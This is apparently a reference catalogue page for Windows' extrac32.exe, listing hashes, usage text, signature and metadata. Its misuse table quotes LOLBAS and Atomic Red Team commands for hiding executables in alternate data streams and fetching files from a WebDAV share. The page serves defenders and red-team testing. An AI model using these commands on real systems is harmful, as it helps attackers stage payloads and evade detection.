---
title: extrac32.exe | Microsoft CAB File Extract Utility
---

# extrac32.exe 

* File Path: `C:\Windows\system32\extrac32.exe`
* Description: Microsoft CAB File Extract Utility

## Hashes

Type | Hash
-- | --
MD5 | `052CB6F7404214AD775D74324E756053`
SHA1 | `F2A15B3A070B3DF2A2C4ADEF2FD60086BB52B6DF`
SHA256 | `2B44ACF71844632F2F24A622EE152AF553AEA63B12A42BB90095111AE13C6913`
SHA384 | `5D48FFCAA2ABCB54454E15234F73F0D93E8500FFF4387FDE4E0E34AA1D5D8F587FA1850C4F0EEF02AA82E232F8754FF0`
SHA512 | `0C6EE7FBBAAD15EE3EE8DB2AF2AF7962E318187E0279304C0C5445E80C3F14A785DA09CBFE67C2D2E6CEA5589D446B5A5571E7084A9B26CEE65096D209CC92D1`
SSDEEP | `768:yQHk2EjPHGCTK4dhdYHvH9XFoDxeaPGoZw2YJ9cDH:HmHGCXKHvH9XFexeqG3JJ9cDH`

## Runtime Data

### Usage (stdout):
```cmhg
Microsoft (R) Cabinet Extraction Tool
Copyright (c) Microsoft Corporation. All rights reserved..

EXTRACT [/Y] [/A] [/D | /E] [/L dir] cabinet [filename ...]
EXTRACT [/Y] source [newname]
EXTRACT [/Y] /C source destination

  cabinet  - Cabinet file (contains two or more files).
  filename - Name of the file to extract from the cabinet.
             Wild cards and multiple filenames (separated by
             blanks) may be used.

  source   - Compressed file (a cabinet with only one file).
  newname  - New filename to give the extracted file.
             If not supplied, the original name is used.

  /A         Process ALL cabinets.  Follows cabinet chain
             starting in first cabinet mentioned.
  /C         Copy source file to destination (to copy from DMF disks).
  /D         Display cabinet directory (use with filename to avoid extract).
  /E         Extract (use instead of *.* to extract all files).
  /L dir     Location to place extracted files (default is current directory).
  /Y         Do not prompt before overwriting an existing file.
```

## Signature

* Status: Signature verified.
* Serial: `33000000BCE120FDD27CC8EE930000000000BC`
* Thumbprint: `E85459B23C232DB3CB94C7A56D47678F58E8E51E`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: extrac32.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 5.00 (rs1_release.160715-1616)
* Product Version: 5.00
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `extrac32.exe` being misused. While `extrac32.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `Name: Extrac32.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\System32\extrac32.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\SysWOW64\extrac32.exe` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020 Strontic.


